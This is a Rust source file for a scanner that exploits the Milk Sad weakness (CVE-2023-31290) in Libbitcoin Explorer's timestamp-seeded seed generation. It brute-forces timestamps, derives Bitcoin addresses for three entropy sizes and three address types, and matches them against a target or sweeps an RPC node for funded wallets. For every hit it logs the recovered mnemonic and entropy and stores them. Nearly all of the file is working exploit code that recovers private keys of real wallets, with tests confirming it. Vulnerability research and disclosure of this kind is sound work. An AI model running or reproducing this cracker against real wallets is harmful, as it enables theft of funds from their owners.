//! Milk Sad Vulnerability Scanner (CVE-2023-31290)
//!
//! Implements scanning for the Libbitcoin Explorer `bx seed` vulnerability where
//! MT19937 PRNG was seeded with only 32-bit timestamp, producing weak entropy.
//!
//! ## Research Update #13 (July 2025)
//!
//! A massive cluster of 224,000+ vulnerable wallets was discovered with the following
//! characteristics:
//! - **Entropy**: 256-bit (24-word BIP39 mnemonics)
//! - **Address Type**: BIP49 P2SH-SegWit (prefix '3')
//! - **Derivation Path**: m/49'/0'/0'/0/0
//! - **Time Period**: Primarily 2018 wallet activity
//! - **Pattern**: Small deposits around 2018, possibly from automated mixing service
//!
//! This scanner fully supports all requirements for detecting Update #13 wallets.
//!
//! ## General Support
//!
//! Supports:
//! - 128-bit (12 words), 192-bit (18 words), 256-bit (24 words) entropy
//! - BIP44 (P2PKH, prefix 1), BIP49 (P2SH-SegWit, prefix 3), BIP84 (Native SegWit, prefix bc1q)
//! - External (0) and internal/change (1) address derivation
//!
//! Reference: https://milksad.info/disclosure.html
//! Update #13: https://milksad.info/posts/research-update-13/

#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use crate::utils::db::{Target, TargetDatabase};
use anyhow::Result;
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, CompressedPublicKey, Network};
use bitcoincore_rpc::{Auth, Client, RpcApi};
use rand_mt::Mt19937GenRand32;
use std::path::PathBuf;
use std::str::FromStr;
use tracing::{error, info, warn};

/// Supported entropy sizes (in bits)
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EntropySize {
    Bits128, // 12 words (default bx seed -b 128)
    Bits192, // 18 words (bx seed -b 192, the default)
    Bits256, // 24 words (bx seed -b 256)
}

impl EntropySize {
    pub fn byte_len(&self) -> usize {
        match self {
            EntropySize::Bits128 => 16,
            EntropySize::Bits192 => 24,
            EntropySize::Bits256 => 32,
        }
    }

    pub fn word_count(&self) -> usize {
        match self {
            EntropySize::Bits128 => 12,
            EntropySize::Bits192 => 18,
            EntropySize::Bits256 => 24,
        }
    }
}

/// Supported address types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum AddressType {
    P2PKH,    // BIP44: m/44'/0'/0'/c/a - Legacy (prefix 1)
    P2SHWPKH, // BIP49: m/49'/0'/0'/c/a - SegWit-compatible (prefix 3)
    P2WPKH,   // BIP84: m/84'/0'/0'/c/a - Native SegWit (prefix bc1q)
}

impl AddressType {
    pub fn purpose(&self) -> u32 {
        match self {
            AddressType::P2PKH => 44,
            AddressType::P2SHWPKH => 49,
            AddressType::P2WPKH => 84,
        }
    }
}

// ============================================================================
// TIME RANGE CONSTANTS
// ============================================================================

/// Research Update #13: Time range for 2018 wallet activity
/// January 1, 2018 00:00:00 UTC to December 31, 2018 23:59:59 UTC
pub const UPDATE_13_START_TIMESTAMP: u32 = 1514764800; // 2018-01-01
pub const UPDATE_13_END_TIMESTAMP: u32 = 1546300799; // 2018-12-31

/// Original Milk Sad discovery period
/// 2011-01-01 to 2023-12-31
pub const MILK_SAD_FULL_START: u32 = 1293840000; // 2011-01-01
pub const MILK_SAD_FULL_END: u32 = 1704067199; // 2023-12-31

// ============================================================================
// SCANNER ENTRY POINT
// ============================================================================

/// Unified Milk Sad Scanner Entry Point
pub fn run_scan(
    target: Option<String>,
    start_ts_opt: Option<u32>,
    end_ts_opt: Option<u32>,
    multipath: bool,
    rpc_config: Option<(String, String, String)>,
    db_path: Option<PathBuf>,
) -> Result<()> {
    info!("Milk Sad Vulnerability Scanner (Enhanced)");
    info!("Supports: 128/192/256-bit entropy, BIP44/49/84 paths");
    info!("Research Update #13: Scans for 224k+ vulnerable wallets");

    // Time range: Default to full Milk Sad period (2011-2023)
    let start_ts = start_ts_opt.unwrap_or(MILK_SAD_FULL_START);
    let end_ts = end_ts_opt.unwrap_or(MILK_SAD_FULL_END);

    // Provide helpful hints for specific scanning scenarios
    if start_ts == UPDATE_13_START_TIMESTAMP && end_ts == UPDATE_13_END_TIMESTAMP {
        info!("📊 Scanning Update #13 time range (2018)");
        info!("   Focus: 24-word mnemonics, BIP49 addresses");
    }

    // Setup RPC if config provided
    let rpc_client = if let Some((url, user, pass)) = rpc_config {
        info!("RPC Enabled: Connecting to {}...", url);
        Some(Client::new(&url, Auth::UserPass(user, pass))?)
    } else {
        None
    };

    if target.is_none() && rpc_client.is_none() {
        error!("Usage Error: You must provide EITHER a --target address OR --rpc-url/user/pass to scan for funds.");
        return Err(anyhow::anyhow!("Missing target or RPC config"));
    }

    match target {
        Some(t) => run_with_target(&t, start_ts, end_ts, multipath, db_path),
        None => run_rpc_scan(start_ts, end_ts, multipath, rpc_client.unwrap(), db_path),
    }
}

/// Legacy Target Mode (Checks against specific address hash)
fn run_with_target(
    target: &str,
    start_ts: u32,
    end_ts: u32,
    multipath: bool,
    db_path: Option<PathBuf>,
) -> Result<()> {
    // Parse address and identify type/purpose
    let address = Address::from_str(target)?.assume_checked();
    let script = address.script_pubkey();

    let (target_hash160_slice, addr_type) = if script.is_p2pkh() {
        (&script.as_bytes()[3..23], AddressType::P2PKH)
    } else if script.is_p2sh() {
        (&script.as_bytes()[2..22], AddressType::P2SHWPKH)
    } else if script.is_p2wpkh() {
        (&script.as_bytes()[2..22], AddressType::P2WPKH)
    } else {
        return Err(anyhow::anyhow!("Unsupported address type for Milk Sad cracking"));
    };

    let mut target_hash160: [u8; 20] = [0; 20];
    target_hash160.copy_from_slice(target_hash160_slice);

    let purpose = addr_type.purpose();

    // Initialize database if path provided
    let db = if let Some(ref path) = db_path {
        Some(TargetDatabase::new(path.clone())?)
    } else {
        None
    };

    #[cfg(feature = "gpu")]
    {
        info!("Milk Sad Vulnerability Scanner (100% GPU)");
        if multipath {
            info!("Mode: Multi-Path (Checking 30 addresses per timestamp)");
        } else {
            info!("Mode: Single-Path (Checking m/{}'/0'/0'/0/0 only)", purpose);
        }
        info!("Target Address: {}", target);
        info!("Target Hash160: {}", hex::encode(&target_hash160));

        info!(
            "Scanning timestamps {} to {} ({} seconds)...",
            start_ts,
            end_ts,
            end_ts - start_ts
        );

        let start_time = std::time::Instant::now();
        let solver = GpuSolver::new()?;

        if multipath {
            let results = solver.compute_milk_sad_crack_multipath(
                start_ts,
                end_ts,
                &target_hash160,
                purpose,
            )?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for (timestamp, addr_idx) in results {
                    // Verify on CPU (Check 128/192/256 to be sure, though GPU currently only does 128)
                    for size in [EntropySize::Bits128, EntropySize::Bits192, EntropySize::Bits256] {
                        let entropy = generate_entropy_msb(timestamp, size);
                        let derived_address =
                            generate_address_from_entropy_vec(&entropy, addr_idx, addr_type, false);

                        if derived_address == target {
                            info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                            info!("Timestamp: {}, Entropy Size: {:?}", timestamp, size);
                            info!("Address Index: {}", addr_idx);
                            info!("Mnemonic: {}", Mnemonic::from_entropy(&entropy)?);

                            if let Some(ref d) = db {
                                d.upsert_target(&Target {
                                    address: target.to_string(),
                                    vuln_class: "milk_sad".to_string(),
                                    first_seen_timestamp: Some(timestamp as i64),
                                    metadata_json: Some(format!(
                                        "{{\"entropy\": \"{}\", \"size\": {:?}, \"index\": {}}}",
                                        hex::encode(&entropy),
                                        size,
                                        addr_idx
                                    )),
                                    status: "cracked".to_string(),
                                })?;
                            }
                            break;
                        }
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        } else {
            let results =
                solver.compute_milk_sad_crack(start_ts, end_ts, &target_hash160, purpose)?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for timestamp in results {
                    for size in [EntropySize::Bits128, EntropySize::Bits192, EntropySize::Bits256] {
                        let entropy = generate_entropy_msb(timestamp as u32, size);
                        let derived_address =
                            generate_address_from_entropy_vec(&entropy, 0, addr_type, false);

                        if derived_address == target {
                            info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                            info!("Timestamp: {}, Entropy Size: {:?}", timestamp, size);
                            info!("Mnemonic: {}", Mnemonic::from_entropy(&entropy)?);

                            if let Some(ref d) = db {
                                d.upsert_target(&Target {
                                    address: target.to_string(),
                                    vuln_class: "milk_sad".to_string(),
                                    first_seen_timestamp: Some(timestamp as i64),
                                    metadata_json: Some(format!(
                                        "{{\"entropy\": \"{}\", \"size\": {:?}}}",
                                        hex::encode(&entropy),
                                        size
                                    )),
                                    status: "cracked".to_string(),
                                })?;
                            }
                            break;
                        }
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        }
        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
        Ok(())
    }

    #[cfg(not(feature = "gpu"))]
    {
        warn!(
            "GPU feature disabled. Running CPU scan for target: {}",
            target
        );
        run_cpu_target_scan(target, start_ts, end_ts, multipath, db_path)
    }
}

/// CPU-based target scan (fallback when GPU not available)
#[cfg(not(feature = "gpu"))]
fn run_cpu_target_scan(
    target: &str,
    start_ts: u32,
    end_ts: u32,
    multipath: bool,
    db_path: Option<PathBuf>,
) -> Result<()> {
    let entropy_sizes = [
        EntropySize::Bits128,
        EntropySize::Bits192,
        EntropySize::Bits256,
    ];
    let address_types = [
        AddressType::P2PKH,
        AddressType::P2SHWPKH,
        AddressType::P2WPKH,
    ];

    let start_time = std::time::Instant::now();
    let mut checked = 0u64;

    let db = if let Some(path) = db_path {
        Some(TargetDatabase::new(path)?)
    } else {
        None
    };

    for ts in start_ts..=end_ts {
        for &entropy_size in &entropy_sizes {
            let entropy = generate_entropy_msb(ts, entropy_size);

            for &addr_type in &address_types {
                let limit = if multipath { 30 } else { 1 };
                for change in [false, true] {
                    for addr_idx in 0..limit {
                        let address = generate_address_from_entropy_vec(
                            &entropy, addr_idx, addr_type, change,
                        );

                        if address == target {
                            warn!("\n🔓 FOUND MATCH!");
                            warn!("Timestamp: {}", ts);
                            warn!("Entropy Size: {:?}", entropy_size);
                            warn!("Address Type: {:?}", addr_type);
                            warn!("Change: {}, Index: {}", change, addr_idx);
                            warn!("Entropy: {}", hex::encode(&entropy));
                            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                                warn!("Mnemonic: {}", mnemonic);
                            }

                            if let Some(ref d) = db {
                                d.upsert_target(&Target {
                                    address: target.to_string(),
                                    vuln_class: "milk_sad".to_string(),
                                    first_seen_timestamp: Some(ts as i64),
                                    metadata_json: Some(format!(
                                        "{{\"entropy\": \"{}\", \"size\": {:?}, \"change\": {}, \"index\": {}}}",
                                        hex::encode(&entropy),
                                        entropy_size,
                                        change,
                                        addr_idx
                                    )),
                                    status: "cracked".to_string(),
                                    ..Default::default()
                                })?;
                            }

                            return Ok(());
                        }
                        checked += 1;
                    }
                }
            }
        }

        if ts % 10000 == 0 {
            info!(
                "Checked {} timestamps, {} addresses total...",
                ts - start_ts,
                checked
            );
        }
    }

    info!(
        "CPU scan complete. Checked {} addresses in {:.2}s",
        checked,
        start_time.elapsed().as_secs_f64()
    );
    Ok(())
}

/// RPC Scan Mode - Enhanced with all entropy sizes and address types
fn run_rpc_scan(
    start_ts: u32,
    end_ts: u32,
    multipath: bool,
    rpc: Client,
    db_path: Option<PathBuf>,
) -> Result<()> {
    info!("Mode: RPC Sweep (Checking ALL entropy sizes and address types)");
    info!("Entropy: 128/192/256-bit | Paths: BIP44/49/84 | Change: yes");
    info!("Scanning {} timestamps...", end_ts - start_ts);

    let entropy_sizes = [
        EntropySize::Bits128,
        EntropySize::Bits192,
        EntropySize::Bits256,
    ];
    let address_types = [
        AddressType::P2PKH,
        AddressType::P2SHWPKH,
        AddressType::P2WPKH,
    ];

    let start_time = std::time::Instant::now();
    let mut checked = 0u64;
    let mut found = 0u64;

    let db = if let Some(ref path) = db_path {
        Some(TargetDatabase::new(path.clone())?)
    } else {
        None
    };

    for t in start_ts..=end_ts {
        for &entropy_size in &entropy_sizes {
            let entropy = generate_entropy_msb(t, entropy_size);

            for &addr_type in &address_types {
                // Check external (0) and internal/change (1) chains
                for change in [false, true] {
                    // Only check index 0 by default to save time, unless multipath
                    let limit = if multipath { 30 } else { 1 };

                    for i in 0..limit {
                        let address_str =
                            generate_address_from_entropy_vec(&entropy, i, addr_type, change);
                        if let Ok(address) = Address::from_str(&address_str) {
                            match rpc.get_received_by_address(&address.assume_checked(), Some(0)) {
                                Ok(balance) => {
                                    if balance.to_sat() > 0 {
                                        found += 1;
                                        warn!("\n💰 FUNDED WALLET FOUND!");
                                        warn!("Timestamp: {}", t);
                                        warn!(
                                            "Entropy Size: {:?} ({} words)",
                                            entropy_size,
                                            entropy_size.word_count()
                                        );
                                        warn!("Address Type: {:?}", addr_type);
                                        warn!(
                                            "Path: m/{}'/{}'/{}'/{}/{}",
                                            addr_type.purpose(),
                                            0,
                                            0,
                                            if change { 1 } else { 0 },
                                            i
                                        );
                                        warn!("Address: {}", address_str);
                                        warn!("Total Received: {}", balance);
                                        warn!("Entropy: {}", hex::encode(&entropy));
                                        if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                                            warn!("Mnemonic: {}", mnemonic);
                                        }

                                        if let Some(ref d) = db {
                                            d.upsert_target(&Target {
                                                address: address_str,
                                                vuln_class: "milk_sad".to_string(),
                                                first_seen_timestamp: Some(t as i64),
                                                metadata_json: Some(format!(
                                                    "{{\"entropy\": \"{}\", \"size\": {:?}, \"change\": {}, \"index\": {}, \"balance\": {}}}",
                                                    hex::encode(&entropy),
                                                    entropy_size,
                                                    change,
                                                    i,
                                                    balance.to_sat()
                                                )),
                                                status: "funded".to_string(),
                                                ..Default::default()
                                            })?;
                                        }
                                    }
                                }
                                Err(_e) => {
                                    // Rate limit or error - skip silently
                                }
                            }
                        }
                        checked += 1;
                    }
                }
            }
        }

        if (t - start_ts).is_multiple_of(1000) && t > start_ts {
            let elapsed = start_time.elapsed().as_secs_f64();
            let speed = checked as f64 / elapsed;
            info!(
                "Progress: {} ts | {} addrs checked | {:.0} addr/s | {} found",
                t - start_ts,
                checked,
                speed,
                found
            );
        }
    }

    info!(
        "RPC Scan complete. Checked {} addresses, found {} funded.",
        checked, found
    );
    Ok(())
}

// ============================================================================
// ENTROPY GENERATION (MSB extraction - bx pattern)
// ============================================================================

/// Generate entropy using MT19937 with MSB extraction (libbitcoin/bx pattern)
///
/// bx takes only the MOST SIGNIFICANT BYTE from each 32-bit MT19937 output,
/// throwing away the other 3 bytes. This means:
/// - 128-bit entropy requires 16 MT19937 outputs
/// - 192-bit entropy requires 24 MT19937 outputs  
/// - 256-bit entropy requires 32 MT19937 outputs
pub fn generate_entropy_msb(timestamp: u32, size: EntropySize) -> Vec<u8> {
    let byte_len = size.byte_len();

    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut entropy = vec![0u8; byte_len];

    // Each entropy byte comes from the MSB of a separate MT19937 output
    for byte in entropy.iter_mut().take(byte_len) {
        let val = rng.next_u32();
        // MSB extraction: take ONLY bits 31:24 (most significant byte)
        *byte = ((val >> 24) & 0xFF) as u8;
    }

    entropy
}

/// Generate 128-bit entropy (legacy function for GPU compatibility)
#[cfg(feature = "gpu")]
pub fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
    let vec = generate_entropy_msb(timestamp, EntropySize::Bits128);
    let mut arr = [0u8; 16];
    arr.copy_from_slice(&vec);
    arr
}

// Non-GPU version for RPC scan
#[cfg(not(feature = "gpu"))]
#[allow(dead_code)]
fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
    let vec = generate_entropy_msb(timestamp, EntropySize::Bits128);
    let mut arr = [0u8; 16];
    arr.copy_from_slice(&vec);
    arr
}

// ============================================================================
// ADDRESS GENERATION (BIP44/49/84)
// ============================================================================

/// Generate Bitcoin address from entropy with configurable address type
///
/// - addr_type: P2PKH (BIP44), P2SHWPKH (BIP49), P2WPKH (BIP84)
/// - change: false = external (0), true = internal/change (1)
/// - addr_index: address index within the chain
pub fn generate_address_from_entropy_vec(
    entropy: &[u8],
    addr_index: u32,
    addr_type: AddressType,
    change: bool,
) -> String {
    let mnemonic = match Mnemonic::from_entropy(entropy) {
        Ok(m) => m,
        Err(_) => return String::new(),
    };
    let seed = mnemonic.to_seed("");

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;

    let root = match Xpriv::new_master(network, &seed) {
        Ok(r) => r,
        Err(_) => return String::new(),
    };

    // Build derivation path: m/purpose'/coin'/account'/change/index
    let purpose = addr_type.purpose();
    let change_idx = if change { 1 } else { 0 };
    let path_str = format!("m/{}'/{}'/{}'/{}/{}", purpose, 0, 0, change_idx, addr_index);

    let path = match DerivationPath::from_str(&path_str) {
        Ok(p) => p,
        Err(_) => return String::new(),
    };

    let derived = match root.derive_priv(&secp, &path) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };

    let private_key = bitcoin::PrivateKey::new(derived.private_key, network);
    let pubkey = private_key.public_key(&secp);

    // Generate address based on type
    match addr_type {
        AddressType::P2PKH => Address::p2pkh(pubkey, network).to_string(),
        AddressType::P2SHWPKH => {
            // P2SH-wrapped SegWit (BIP49) - prefix "3"
            let compressed = CompressedPublicKey(pubkey.inner);
            Address::p2shwpkh(&compressed, network).to_string()
        }
        AddressType::P2WPKH => {
            // Native SegWit (BIP84) - prefix "bc1q"
            let compressed = CompressedPublicKey(pubkey.inner);
            Address::p2wpkh(&compressed, network).to_string()
        }
    }
}

/// Legacy function for GPU compatibility
#[cfg(feature = "gpu")]
#[allow(dead_code)]
fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
    generate_address_from_entropy_vec(entropy, addr_index, AddressType::P2PKH, false)
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_entropy_generation_128bit() {
        // Timestamp 0 should produce "milk sad wage cup..." mnemonic
        let entropy = generate_entropy_msb(0, EntropySize::Bits128);
        assert_eq!(entropy.len(), 16);

        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
        let words: Vec<&str> = mnemonic.words().collect();
        assert_eq!(words[0], "milk");
        assert_eq!(words[1], "sad");
    }

    #[test]
    fn test_entropy_generation_192bit() {
        let entropy = generate_entropy_msb(0, EntropySize::Bits192);
        assert_eq!(entropy.len(), 24);

        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
        assert_eq!(mnemonic.word_count(), 18);
    }

    #[test]
    fn test_entropy_generation_256bit() {
        let entropy = generate_entropy_msb(0, EntropySize::Bits256);
        assert_eq!(entropy.len(), 32);

        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
        assert_eq!(mnemonic.word_count(), 24);
    }

    #[test]
    fn test_address_types() {
        let entropy = generate_entropy_msb(0, EntropySize::Bits128);

        // BIP44 - Legacy P2PKH (prefix 1)
        let p2pkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
        assert!(
            p2pkh.starts_with('1'),
            "P2PKH should start with 1, got: {}",
            p2pkh
        );

        // BIP49 - SegWit-compatible P2SH (prefix 3)
        let p2shwpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2SHWPKH, false);
        assert!(
            p2shwpkh.starts_with('3'),
            "P2SHWPKH should start with 3, got: {}",
            p2shwpkh
        );

        // BIP84 - Native SegWit (prefix bc1q)
        let p2wpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2WPKH, false);
        assert!(
            p2wpkh.starts_with("bc1q"),
            "P2WPKH should start with bc1q, got: {}",
            p2wpkh
        );
    }

    #[test]
    fn test_change_addresses() {
        let entropy = generate_entropy_msb(12345, EntropySize::Bits128);

        let external = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
        let internal = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, true);

        // External and internal addresses should be different
        assert_ne!(external, internal);
    }

    /// CRITICAL: Validate implementation produces correct 'milk sad' mnemonic for timestamp 0
    /// This is the canonical test case from the Milk Sad vulnerability disclosure
    #[test]
    fn test_validate_milk_sad_mnemonic() {
        // Timestamp 0 with 256-bit entropy MUST produce "milk sad wage cup..." mnemonic
        // This is THE defining test for libbitcoin/bx vulnerability
        let entropy_ts0 = generate_entropy_msb(0, EntropySize::Bits256);
        let mnemonic = Mnemonic::from_entropy(&entropy_ts0).unwrap();
        let words: Vec<&str> = mnemonic.words().collect();

        assert_eq!(
            words[0], "milk",
            "First word must be 'milk' for timestamp 0"
        );
        assert_eq!(words[1], "sad", "Second word must be 'sad' for timestamp 0");
        assert_eq!(
            words[2], "wage",
            "Third word must be 'wage' for timestamp 0"
        );
        assert_eq!(words[3], "cup", "Fourth word must be 'cup' for timestamp 0");

        // Also validate 128-bit entropy (12 words) produces valid mnemonic
        let entropy_128 = generate_entropy_msb(0, EntropySize::Bits128);
        let mnemonic_128 = Mnemonic::from_entropy(&entropy_128).unwrap();
        assert_eq!(mnemonic_128.word_count(), 12);

        // The 12-word version also starts with "milk sad" for timestamp 0
        let words_128: Vec<&str> = mnemonic_128.words().collect();
        assert_eq!(words_128[0], "milk", "128-bit: First word must be 'milk'");
        assert_eq!(words_128[1], "sad", "128-bit: Second word must be 'sad'");
    }

    /// Test Research Update #13 time range constants
    #[test]
    fn test_update_13_time_constants() {
        // Verify 2018 time range
        assert_eq!(UPDATE_13_START_TIMESTAMP, 1514764800); // 2018-01-01 00:00:00 UTC
        assert_eq!(UPDATE_13_END_TIMESTAMP, 1546300799); // 2018-12-31 23:59:59 UTC

        // Verify full range (compile-time constant checks for documentation)
        #[allow(clippy::assertions_on_constants)]
        {
            assert!(MILK_SAD_FULL_START < UPDATE_13_START_TIMESTAMP);
            assert!(UPDATE_13_END_TIMESTAMP < MILK_SAD_FULL_END);
        }

        // Verify one full year
        let year_in_seconds = 365 * 24 * 60 * 60;
        let range = UPDATE_13_END_TIMESTAMP - UPDATE_13_START_TIMESTAMP + 1;
        assert_eq!(range, year_in_seconds, "Should be exactly one year");
    }

    /// Test Update #13 specific requirements: 24-word + BIP49
    #[test]
    fn test_update_13_wallet_generation() {
        // Generate wallet with Update #13 characteristics
        let timestamp = 1520000000u32; // Mid-2018
        let entropy = generate_entropy_msb(timestamp, EntropySize::Bits256);

        // Should be 32 bytes for 256-bit
        assert_eq!(entropy.len(), 32);

        // Generate BIP49 address
        let address = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2SHWPKH, false);

        // Should be P2SH-SegWit (prefix '3')
        assert!(
            address.starts_with('3'),
            "Update #13 addresses should start with '3', got: {}",
            address
        );

        // Verify mnemonic is 24 words
        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
        assert_eq!(
            mnemonic.word_count(),
            24,
            "Update #13 uses 24-word mnemonics"
        );
    }
}
